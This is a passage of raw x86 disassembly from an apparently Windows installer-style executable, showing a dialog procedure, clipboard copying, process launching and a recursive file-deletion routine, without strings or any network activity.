  405786:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40578d:	57                   	push   %edi
  40578e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405791:	0f 85 89 01 00 00    	jne    0x405920
  405797:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  40579b:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  40579f:	6a 02                	push   $0x2
  4057a1:	33 c0                	xor    %eax,%eax
  4057a3:	5e                   	pop    %esi
  4057a4:	8d 7d e0             	lea    -0x20(%ebp),%edi
  4057a7:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4057aa:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4057ad:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4057b0:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4057b3:	ab                   	stos   %eax,%es:(%edi)
  4057b4:	ab                   	stos   %eax,%es:(%edi)
  4057b5:	a1 10 47 43 00       	mov    0x434710,%eax
  4057ba:	8b 3d 3c 82 40 00    	mov    0x40823c,%edi
  4057c0:	68 03 04 00 00       	push   $0x403
  4057c5:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4057c8:	8b 40 60             	mov    0x60(%eax),%eax
  4057cb:	ff 75 08             	push   0x8(%ebp)
  4057ce:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4057d1:	89 45 10             	mov    %eax,0x10(%ebp)
  4057d4:	ff d7                	call   *%edi
  4057d6:	68 ee 03 00 00       	push   $0x3ee
  4057db:	a3 d0 36 43 00       	mov    %eax,0x4336d0
  4057e0:	ff 75 08             	push   0x8(%ebp)
  4057e3:	ff d7                	call   *%edi
  4057e5:	68 f8 03 00 00       	push   $0x3f8
  4057ea:	a3 c8 36 43 00       	mov    %eax,0x4336c8
  4057ef:	ff 75 08             	push   0x8(%ebp)
  4057f2:	ff d7                	call   *%edi
  4057f4:	ff 35 d0 36 43 00    	push   0x4336d0
  4057fa:	a3 e4 36 43 00       	mov    %eax,0x4336e4
  4057ff:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405802:	e8 5f ed ff ff       	call   0x404566
  405807:	6a 04                	push   $0x4
  405809:	e8 b1 f6 ff ff       	call   0x404ebf
  40580e:	a3 d4 36 43 00       	mov    %eax,0x4336d4
  405813:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405816:	50                   	push   %eax
  405817:	89 1d ec 36 43 00    	mov    %ebx,0x4336ec
  40581d:	ff 75 fc             	push   -0x4(%ebp)
  405820:	ff 15 64 82 40 00    	call   *0x408264
  405826:	56                   	push   %esi
  405827:	ff 15 88 82 40 00    	call   *0x408288
  40582d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405830:	8b 35 58 82 40 00    	mov    0x408258,%esi
  405836:	2b c8                	sub    %eax,%ecx
  405838:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40583b:	50                   	push   %eax
  40583c:	53                   	push   %ebx
  40583d:	68 61 10 00 00       	push   $0x1061
  405842:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405845:	ff 75 fc             	push   -0x4(%ebp)
  405848:	ff d6                	call   *%esi
  40584a:	b8 00 40 00 00       	mov    $0x4000,%eax
  40584f:	50                   	push   %eax
  405850:	50                   	push   %eax
  405851:	68 36 10 00 00       	push   $0x1036
  405856:	ff 75 fc             	push   -0x4(%ebp)
  405859:	ff d6                	call   *%esi
  40585b:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40585e:	7c 1c                	jl     0x40587c
  405860:	ff 75 0c             	push   0xc(%ebp)
  405863:	53                   	push   %ebx
  405864:	68 01 10 00 00       	push   $0x1001
  405869:	ff 75 fc             	push   -0x4(%ebp)
  40586c:	ff d6                	call   *%esi
  40586e:	ff 75 0c             	push   0xc(%ebp)
  405871:	53                   	push   %ebx
  405872:	68 26 10 00 00       	push   $0x1026
  405877:	ff 75 fc             	push   -0x4(%ebp)
  40587a:	ff d6                	call   *%esi
  40587c:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40587f:	7c 0e                	jl     0x40588f
  405881:	ff 75 10             	push   0x10(%ebp)
  405884:	53                   	push   %ebx
  405885:	68 24 10 00 00       	push   $0x1024
  40588a:	ff 75 fc             	push   -0x4(%ebp)
  40588d:	ff d6                	call   *%esi
  40588f:	8b 45 14             	mov    0x14(%ebp),%eax
  405892:	ff 70 30             	push   0x30(%eax)
  405895:	6a 1b                	push   $0x1b
  405897:	ff 75 08             	push   0x8(%ebp)
  40589a:	e8 92 ec ff ff       	call   0x404531
  40589f:	f6 05 18 47 43 00 03 	testb  $0x3,0x434718
  4058a6:	74 34                	je     0x4058dc
  4058a8:	53                   	push   %ebx
  4058a9:	ff 35 d0 36 43 00    	push   0x4336d0
  4058af:	ff 15 28 82 40 00    	call   *0x408228
  4058b5:	f6 05 18 47 43 00 02 	testb  $0x2,0x434718
  4058bc:	75 0d                	jne    0x4058cb
  4058be:	6a 08                	push   $0x8
  4058c0:	ff 75 fc             	push   -0x4(%ebp)
  4058c3:	ff 15 28 82 40 00    	call   *0x408228
  4058c9:	eb 06                	jmp    0x4058d1
  4058cb:	89 1d d0 36 43 00    	mov    %ebx,0x4336d0
  4058d1:	ff 35 c8 36 43 00    	push   0x4336c8
  4058d7:	e8 8a ec ff ff       	call   0x404566
  4058dc:	68 ec 03 00 00       	push   $0x3ec
  4058e1:	ff 75 08             	push   0x8(%ebp)
  4058e4:	ff d7                	call   *%edi
  4058e6:	68 00 00 30 75       	push   $0x75300000
  4058eb:	8b f8                	mov    %eax,%edi
  4058ed:	53                   	push   %ebx
  4058ee:	68 01 04 00 00       	push   $0x401
  4058f3:	57                   	push   %edi
  4058f4:	ff d6                	call   *%esi
  4058f6:	f6 05 18 47 43 00 04 	testb  $0x4,0x434718
  4058fd:	0f 84 fc 01 00 00    	je     0x405aff
  405903:	ff 75 10             	push   0x10(%ebp)
  405906:	53                   	push   %ebx
  405907:	68 09 04 00 00       	push   $0x409
  40590c:	57                   	push   %edi
  40590d:	ff d6                	call   *%esi
  40590f:	ff 75 0c             	push   0xc(%ebp)
  405912:	53                   	push   %ebx
  405913:	68 01 20 00 00       	push   $0x2001
  405918:	57                   	push   %edi
  405919:	ff d6                	call   *%esi
  40591b:	e9 df 01 00 00       	jmp    0x405aff
  405920:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405927:	75 28                	jne    0x405951
  405929:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40592c:	50                   	push   %eax
  40592d:	53                   	push   %ebx
  40592e:	68 ec 03 00 00       	push   $0x3ec
  405933:	ff 75 08             	push   0x8(%ebp)
  405936:	ff 15 3c 82 40 00    	call   *0x40823c
  40593c:	50                   	push   %eax
  40593d:	68 0a 57 40 00       	push   $0x40570a
  405942:	53                   	push   %ebx
  405943:	53                   	push   %ebx
  405944:	ff 15 84 80 40 00    	call   *0x408084
  40594a:	50                   	push   %eax
  40594b:	ff 15 fc 80 40 00    	call   *0x4080fc
  405951:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405958:	8b 3d 28 82 40 00    	mov    0x408228,%edi
  40595e:	75 1c                	jne    0x40597c
  405960:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405966:	75 39                	jne    0x4059a1
  405968:	53                   	push   %ebx
  405969:	ff 35 d0 36 43 00    	push   0x4336d0
  40596f:	ff d7                	call   *%edi
  405971:	6a 08                	push   $0x8
  405973:	56                   	push   %esi
  405974:	ff d7                	call   *%edi
  405976:	56                   	push   %esi
  405977:	e8 ea eb ff ff       	call   0x404566
  40597c:	33 f6                	xor    %esi,%esi
  40597e:	46                   	inc    %esi
  40597f:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  405986:	75 54                	jne    0x4059dc
  405988:	39 1d cc 36 43 00    	cmp    %ebx,0x4336cc
  40598e:	74 26                	je     0x4059b6
  405990:	6a 78                	push   $0x78
  405992:	c7 05 38 b2 42 00 02 	movl   $0x2,0x42b238
  405999:	00 00 00 
  40599c:	e8 69 eb ff ff       	call   0x40450a
  4059a1:	ff 75 14             	push   0x14(%ebp)
  4059a4:	ff 75 10             	push   0x10(%ebp)
  4059a7:	ff 75 0c             	push   0xc(%ebp)
  4059aa:	e8 e9 eb ff ff       	call   0x404598
  4059af:	5f                   	pop    %edi
  4059b0:	5e                   	pop    %esi
  4059b1:	5b                   	pop    %ebx
  4059b2:	c9                   	leave
  4059b3:	c2 10 00             	ret    $0x10
  4059b6:	6a 08                	push   $0x8
  4059b8:	ff 35 08 47 43 00    	push   0x434708
  4059be:	ff d7                	call   *%edi
  4059c0:	39 1d 8c 47 43 00    	cmp    %ebx,0x43478c
  4059c6:	75 0e                	jne    0x4059d6
  4059c8:	a1 40 ba 42 00       	mov    0x42ba40,%eax
  4059cd:	53                   	push   %ebx
  4059ce:	ff 70 34             	push   0x34(%eax)
  4059d1:	e8 61 fc ff ff       	call   0x405637
  4059d6:	56                   	push   %esi
  4059d7:	e8 2e eb ff ff       	call   0x40450a
  4059dc:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  4059e0:	75 bf                	jne    0x4059a1
  4059e2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059e5:	39 45 10             	cmp    %eax,0x10(%ebp)
  4059e8:	75 b7                	jne    0x4059a1
  4059ea:	53                   	push   %ebx
  4059eb:	53                   	push   %ebx
  4059ec:	68 04 10 00 00       	push   $0x1004
  4059f1:	50                   	push   %eax
  4059f2:	ff 15 58 82 40 00    	call   *0x408258
  4059f8:	3b c3                	cmp    %ebx,%eax
  4059fa:	89 45 0c             	mov    %eax,0xc(%ebp)
  4059fd:	0f 8e fc 00 00 00    	jle    0x405aff
  405a03:	ff 15 98 81 40 00    	call   *0x408198
  405a09:	6a e1                	push   $0xffffffe1
  405a0b:	53                   	push   %ebx
  405a0c:	8b f8                	mov    %eax,%edi
  405a0e:	e8 dc 0b 00 00       	call   0x4065ef
  405a13:	50                   	push   %eax
  405a14:	56                   	push   %esi
  405a15:	53                   	push   %ebx
  405a16:	57                   	push   %edi
  405a17:	ff 15 9c 81 40 00    	call   *0x40819c
  405a1d:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405a20:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405a24:	c1 e9 10             	shr    $0x10,%ecx
  405a27:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405a2b:	0f bf c9             	movswl %cx,%ecx
  405a2e:	75 13                	jne    0x405a43
  405a30:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405a33:	50                   	push   %eax
  405a34:	ff 75 fc             	push   -0x4(%ebp)
  405a37:	ff 15 e8 81 40 00    	call   *0x4081e8
  405a3d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405a40:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405a43:	53                   	push   %ebx
  405a44:	ff 75 08             	push   0x8(%ebp)
  405a47:	53                   	push   %ebx
  405a48:	51                   	push   %ecx
  405a49:	50                   	push   %eax
  405a4a:	68 80 01 00 00       	push   $0x180
  405a4f:	57                   	push   %edi
  405a50:	ff 15 a0 81 40 00    	call   *0x4081a0
  405a56:	3b c6                	cmp    %esi,%eax
  405a58:	0f 85 a1 00 00 00    	jne    0x405aff
  405a5e:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a61:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405a64:	c7 45 d4 68 ca 42 00 	movl   $0x42ca68,-0x2c(%ebp)
  405a6b:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  405a72:	89 45 08             	mov    %eax,0x8(%ebp)
  405a75:	bf 73 10 00 00       	mov    $0x1073,%edi
  405a7a:	ff 4d 08             	decl   0x8(%ebp)
  405a7d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405a80:	50                   	push   %eax
  405a81:	ff 75 08             	push   0x8(%ebp)
  405a84:	57                   	push   %edi
  405a85:	ff 75 fc             	push   -0x4(%ebp)
  405a88:	ff 15 58 82 40 00    	call   *0x408258
  405a8e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405a91:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405a95:	75 e3                	jne    0x405a7a
  405a97:	53                   	push   %ebx
  405a98:	ff 15 a4 81 40 00    	call   *0x4081a4
  405a9e:	ff 15 a8 81 40 00    	call   *0x4081a8
  405aa4:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405aa7:	50                   	push   %eax
  405aa8:	6a 42                	push   $0x42
  405aaa:	ff 15 10 81 40 00    	call   *0x408110
  405ab0:	50                   	push   %eax
  405ab1:	89 45 08             	mov    %eax,0x8(%ebp)
  405ab4:	ff 15 88 80 40 00    	call   *0x408088
  405aba:	8b f0                	mov    %eax,%esi
  405abc:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405abf:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405ac2:	50                   	push   %eax
  405ac3:	53                   	push   %ebx
  405ac4:	57                   	push   %edi
  405ac5:	ff 75 fc             	push   -0x4(%ebp)
  405ac8:	ff 15 58 82 40 00    	call   *0x408258
  405ace:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405ad1:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405ad6:	46                   	inc    %esi
  405ad7:	46                   	inc    %esi
  405ad8:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  405add:	46                   	inc    %esi
  405ade:	46                   	inc    %esi
  405adf:	43                   	inc    %ebx
  405ae0:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405ae3:	7c d7                	jl     0x405abc
  405ae5:	ff 75 08             	push   0x8(%ebp)
  405ae8:	ff 15 8c 80 40 00    	call   *0x40808c
  405aee:	ff 75 08             	push   0x8(%ebp)
  405af1:	6a 0d                	push   $0xd
  405af3:	ff 15 ac 81 40 00    	call   *0x4081ac
  405af9:	ff 15 b0 81 40 00    	call   *0x4081b0
  405aff:	33 c0                	xor    %eax,%eax
  405b01:	e9 a9 fe ff ff       	jmp    0x4059af
  405b06:	55                   	push   %ebp
  405b07:	8b ec                	mov    %esp,%ebp
  405b09:	83 ec 20             	sub    $0x20,%esp
  405b0c:	b8 f0 83 40 00       	mov    $0x4083f0,%eax
  405b11:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405b15:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405b18:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405b1b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405b1e:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405b22:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405b26:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405b29:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405b2c:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405b30:	50                   	push   %eax
  405b31:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405b37:	ff 75 08             	push   0x8(%ebp)
  405b3a:	c7 45 f0 e0 83 40 00 	movl   $0x4083e0,-0x10(%ebp)
  405b41:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405b48:	ff 15 80 80 40 00    	call   *0x408080
  405b4e:	85 c0                	test   %eax,%eax
  405b50:	74 04                	je     0x405b56
  405b52:	33 c0                	xor    %eax,%eax
  405b54:	eb 06                	jmp    0x405b5c
  405b56:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b5c:	c9                   	leave
  405b5d:	c2 04 00             	ret    $0x4
  405b60:	6a 00                	push   $0x0
  405b62:	ff 74 24 08          	push   0x8(%esp)
  405b66:	ff 15 80 80 40 00    	call   *0x408080
  405b6c:	85 c0                	test   %eax,%eax
  405b6e:	74 04                	je     0x405b74
  405b70:	33 c0                	xor    %eax,%eax
  405b72:	eb 06                	jmp    0x405b7a
  405b74:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b7a:	c2 04 00             	ret    $0x4
  405b7d:	6a 06                	push   $0x6
  405b7f:	e8 22 0e 00 00       	call   0x4069a6
  405b84:	85 c0                	test   %eax,%eax
  405b86:	74 0a                	je     0x405b92
  405b88:	ff d0                	call   *%eax
  405b8a:	85 c0                	test   %eax,%eax
  405b8c:	74 04                	je     0x405b92
  405b8e:	33 c0                	xor    %eax,%eax
  405b90:	40                   	inc    %eax
  405b91:	c3                   	ret
  405b92:	33 c0                	xor    %eax,%eax
  405b94:	c3                   	ret
  405b95:	55                   	push   %ebp
  405b96:	8b ec                	mov    %esp,%ebp
  405b98:	83 ec 10             	sub    $0x10,%esp
  405b9b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405b9e:	c7 05 70 fa 42 00 44 	movl   $0x44,0x42fa70
  405ba5:	00 00 00 
  405ba8:	50                   	push   %eax
  405ba9:	33 c0                	xor    %eax,%eax
  405bab:	68 70 fa 42 00       	push   $0x42fa70
  405bb0:	50                   	push   %eax
  405bb1:	50                   	push   %eax
  405bb2:	68 00 00 00 04       	push   $0x4000000
  405bb7:	50                   	push   %eax
  405bb8:	50                   	push   %eax
  405bb9:	50                   	push   %eax
  405bba:	ff 75 08             	push   0x8(%ebp)
  405bbd:	50                   	push   %eax
  405bbe:	ff 15 7c 80 40 00    	call   *0x40807c
  405bc4:	85 c0                	test   %eax,%eax
  405bc6:	74 0c                	je     0x405bd4
  405bc8:	ff 75 f4             	push   -0xc(%ebp)
  405bcb:	ff 15 fc 80 40 00    	call   *0x4080fc
  405bd1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405bd4:	c9                   	leave
  405bd5:	c2 04 00             	ret    $0x4
  405bd8:	8b 44 24 04          	mov    0x4(%esp),%eax
  405bdc:	50                   	push   %eax
  405bdd:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405be1:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405be7:	ff 15 84 81 40 00    	call   *0x408184
  405bed:	c2 04 00             	ret    $0x4
  405bf0:	ff 25 94 81 40 00    	jmp    *0x408194
  405bf6:	68 00 04 00 00       	push   $0x400
  405bfb:	ff 74 24 0c          	push   0xc(%esp)
  405bff:	ff 74 24 0c          	push   0xc(%esp)
  405c03:	ff 35 d8 36 43 00    	push   0x4336d8
  405c09:	ff 15 90 81 40 00    	call   *0x408190
  405c0f:	c2 08 00             	ret    $0x8
  405c12:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c16:	8b c8                	mov    %eax,%ecx
  405c18:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405c1e:	83 3d a0 47 43 00 00 	cmpl   $0x0,0x4347a0
  405c25:	74 05                	je     0x405c2c
  405c27:	c1 e8 15             	shr    $0x15,%eax
  405c2a:	75 47                	jne    0x405c73
  405c2c:	83 3d a8 47 43 00 00 	cmpl   $0x0,0x4347a8
  405c33:	74 06                	je     0x405c3b
  405c35:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405c3b:	a1 08 47 43 00       	mov    0x434708,%eax
  405c40:	68 b0 a3 40 00       	push   $0x40a3b0
  405c45:	a3 b4 a3 40 00       	mov    %eax,0x40a3b4
  405c4a:	a1 00 47 43 00       	mov    0x434700,%eax
  405c4f:	a3 b8 a3 40 00       	mov    %eax,0x40a3b8
  405c54:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c58:	a3 bc a3 40 00       	mov    %eax,0x40a3bc
  405c5d:	c7 05 c0 a3 40 00 00 	movl   $0x433700,0x40a3c0
  405c64:	37 43 00 
  405c67:	89 0d c4 a3 40 00    	mov    %ecx,0x40a3c4
  405c6d:	ff 15 8c 81 40 00    	call   *0x40818c
  405c73:	c2 08 00             	ret    $0x8
  405c76:	56                   	push   %esi
  405c77:	8b 74 24 08          	mov    0x8(%esp),%esi
  405c7b:	57                   	push   %edi
  405c7c:	56                   	push   %esi
  405c7d:	e8 fb 03 00 00       	call   0x40607d
  405c82:	8b f8                	mov    %eax,%edi
  405c84:	83 ff ff             	cmp    $0xffffffff,%edi
  405c87:	74 2e                	je     0x405cb7
  405c89:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405c8e:	56                   	push   %esi
  405c8f:	74 08                	je     0x405c99
  405c91:	ff 15 78 80 40 00    	call   *0x408078
  405c97:	eb 06                	jmp    0x405c9f
  405c99:	ff 15 44 81 40 00    	call   *0x408144
  405c9f:	85 c0                	test   %eax,%eax
  405ca1:	74 05                	je     0x405ca8
  405ca3:	33 c0                	xor    %eax,%eax
  405ca5:	40                   	inc    %eax
  405ca6:	eb 11                	jmp    0x405cb9
  405ca8:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405cad:	75 08                	jne    0x405cb7
  405caf:	57                   	push   %edi
  405cb0:	56                   	push   %esi
  405cb1:	ff 15 d8 80 40 00    	call   *0x4080d8
  405cb7:	33 c0                	xor    %eax,%eax
  405cb9:	5f                   	pop    %edi
  405cba:	5e                   	pop    %esi
  405cbb:	c2 08 00             	ret    $0x8
  405cbe:	55                   	push   %ebp
  405cbf:	8b ec                	mov    %esp,%ebp
  405cc1:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405cc7:	53                   	push   %ebx
  405cc8:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405ccb:	56                   	push   %esi
  405ccc:	57                   	push   %edi
  405ccd:	8b 7d 08             	mov    0x8(%ebp),%edi
  405cd0:	8b c3                	mov    %ebx,%eax
  405cd2:	83 e0 04             	and    $0x4,%eax
  405cd5:	57                   	push   %edi
  405cd6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405cd9:	e8 ab 02 00 00       	call   0x405f89
  405cde:	f6 c3 08             	test   $0x8,%bl
  405ce1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405ce4:	74 17                	je     0x405cfd
  405ce6:	57                   	push   %edi
  405ce7:	ff 15 44 81 40 00    	call   *0x408144
  405ced:	f7 d8                	neg    %eax
  405cef:	1b c0                	sbb    %eax,%eax
  405cf1:	40                   	inc    %eax
  405cf2:	01 05 88 47 43 00    	add    %eax,0x434788
  405cf8:	e9 7d 01 00 00       	jmp    0x405e7a
  405cfd:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405d00:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405d04:	74 11                	je     0x405d17
  405d06:	85 c0                	test   %eax,%eax
  405d08:	0f 84 1a 01 00 00    	je     0x405e28
  405d0e:	f6 c3 02             	test   $0x2,%bl
  405d11:	0f 84 11 01 00 00    	je     0x405e28
  405d17:	be 70 ea 42 00       	mov    $0x42ea70,%esi
  405d1c:	57                   	push   %edi
  405d1d:	56                   	push   %esi
  405d1e:	e8 8f 08 00 00       	call   0x4065b2
  405d23:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405d27:	74 0d                	je     0x405d36
  405d29:	68 6c a5 40 00       	push   $0x40a56c
  405d2e:	56                   	push   %esi
  405d2f:	e8 9a 08 00 00       	call   0x4065ce
  405d34:	eb 06                	jmp    0x405d3c
  405d36:	57                   	push   %edi
  405d37:	e8 91 01 00 00       	call   0x405ecd
  405d3c:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405d40:	75 0a                	jne    0x405d4c
  405d42:	66 83 3d 70 ea 42 00 	cmpw   $0x5c,0x42ea70
  405d49:	5c 
  405d4a:	75 0b                	jne    0x405d57
  405d4c:	68 14 a0 40 00       	push   $0x40a014
  405d51:	57                   	push   %edi
  405d52:	e8 77 08 00 00       	call   0x4065ce
  405d57:	57                   	push   %edi
  405d58:	e8 6b 08 00 00       	call   0x4065c8
  405d5d:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405d60:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405d66:	50                   	push   %eax
  405d67:	56                   	push   %esi
  405d68:	ff 15 40 81 40 00    	call   *0x408140
  405d6e:	8b f0                	mov    %eax,%esi
  405d70:	83 fe ff             	cmp    $0xffffffff,%esi
  405d73:	0f 84 a4 00 00 00    	je     0x405e1d
  405d79:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405d80:	2e 
  405d81:	75 1e                	jne    0x405da1
  405d83:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405d8a:	00 
  405d8b:	74 73                	je     0x405e00
  405d8d:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405d94:	2e 
  405d95:	75 0a                	jne    0x405da1
  405d97:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405d9e:	00 
  405d9f:	74 5f                	je     0x405e00
  405da1:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405da7:	50                   	push   %eax
  405da8:	53                   	push   %ebx
  405da9:	e8 04 08 00 00       	call   0x4065b2
  405dae:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405db5:	74 15                	je     0x405dcc
  405db7:	8b 45 0c             	mov    0xc(%ebp),%eax
  405dba:	83 e0 03             	and    $0x3,%eax
  405dbd:	3c 03                	cmp    $0x3,%al
  405dbf:	75 3f                	jne    0x405e00
  405dc1:	ff 75 0c             	push   0xc(%ebp)
  405dc4:	57                   	push   %edi
  405dc5:	e8 f4 fe ff ff       	call   0x405cbe
  405dca:	eb 34                	jmp    0x405e00
  405dcc:	ff 75 fc             	push   -0x4(%ebp)
  405dcf:	57                   	push   %edi
  405dd0:	e8 a1 fe ff ff       	call   0x405c76
  405dd5:	85 c0                	test   %eax,%eax
  405dd7:	75 1f                	jne    0x405df8
  405dd9:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405ddc:	74 12                	je     0x405df0
  405dde:	57                   	push   %edi
  405ddf:	6a f1                	push   $0xfffffff1
  405de1:	e8 51 f8 ff ff       	call   0x405637
  405de6:	6a 00                	push   $0x0
  405de8:	57                   	push   %edi
  405de9:	e8 84 05 00 00       	call   0x406372
  405dee:	eb 10                	jmp    0x405e00
  405df0:	ff 05 88 47 43 00    	incl   0x434788
  405df6:	eb 08                	jmp    0x405e00
  405df8:	57                   	push   %edi
  405df9:	6a f2                	push   $0xfffffff2
  405dfb:	e8 37 f8 ff ff       	call   0x405637
  405e00:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405e06:	50                   	push   %eax
  405e07:	56                   	push   %esi
  405e08:	ff 15 3c 81 40 00    	call   *0x40813c
  405e0e:	85 c0                	test   %eax,%eax
  405e10:	0f 85 63 ff ff ff    	jne    0x405d79
  405e16:	56                   	push   %esi
  405e17:	ff 15 38 81 40 00    	call   *0x408138
  405e1d:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405e21:	74 05                	je     0x405e28
  405e23:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405e28:	33 f6                	xor    %esi,%esi
  405e2a:	39 75 08             	cmp    %esi,0x8(%ebp)
  405e2d:	74 4b                	je     0x405e7a
  405e2f:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405e32:	75 08                	jne    0x405e3c
  405e34:	ff 05 88 47 43 00    	incl   0x434788
  405e3a:	eb 3e                	jmp    0x405e7a
  405e3c:	57                   	push   %edi
  405e3d:	e8 cd 0a 00 00       	call   0x40690f
  405e42:	85 c0                	test   %eax,%eax
  405e44:	74 34                	je     0x405e7a
  405e46:	57                   	push   %edi
  405e47:	e8 35 00 00 00       	call   0x405e81
  405e4c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e4f:	0c 01                	or     $0x1,%al
  405e51:	50                   	push   %eax
  405e52:	57                   	push   %edi
  405e53:	e8 1e fe ff ff       	call   0x405c76
  405e58:	85 c0                	test   %eax,%eax
  405e5a:	75 16                	jne    0x405e72
  405e5c:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405e5f:	74 d3                	je     0x405e34
  405e61:	57                   	push   %edi
  405e62:	6a f1                	push   $0xfffffff1
  405e64:	e8 ce f7 ff ff       	call   0x405637
  405e69:	56                   	push   %esi
  405e6a:	57                   	push   %edi
  405e6b:	e8 02 05 00 00       	call   0x406372
  405e70:	eb 08                	jmp    0x405e7a
  405e72:	57                   	push   %edi
  405e73:	6a e5                	push   $0xffffffe5
  405e75:	e8 bd f7 ff ff       	call   0x405637
  405e7a:	5f                   	pop    %edi
  405e7b:	5e                   	pop    %esi
  405e7c:	5b                   	pop    %ebx
  405e7d:	c9                   	leave
  405e7e:	c2 08 00             	ret    $0x8
  405e81:	56                   	push   %esi
  405e82:	8b 74 24 08          	mov    0x8(%esp),%esi
  405e86:	56                   	push   %esi
  405e87:	e8 3c 07 00 00       	call   0x4065c8
  405e8c:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405e8f:	50                   	push   %eax
  405e90:	56                   	push   %esi
  405e91:	ff 15 fc 81 40 00    	call   *0x4081fc
  405e97:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405e9b:	74 0b                	je     0x405ea8
  405e9d:	68 14 a0 40 00       	push   $0x40a014
  405ea2:	56                   	push   %esi
  405ea3:	e8 26 07 00 00       	call   0x4065ce
  405ea8:	8b c6                	mov    %esi,%eax
  405eaa:	5e                   	pop    %esi
  405eab:	c2 04 00             	ret    $0x4
  405eae:	8b 44 24 04          	mov    0x4(%esp),%eax
  405eb2:	eb 0e                	jmp    0x405ec2
  405eb4:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405eb9:	74 0f                	je     0x405eca
  405ebb:	50                   	push   %eax
  405ebc:	ff 15 08 82 40 00    	call   *0x408208
  405ec2:	66 8b 08             	mov    (%eax),%cx
  405ec5:	66 85 c9             	test   %cx,%cx
  405ec8:	75 ea                	jne    0x405eb4
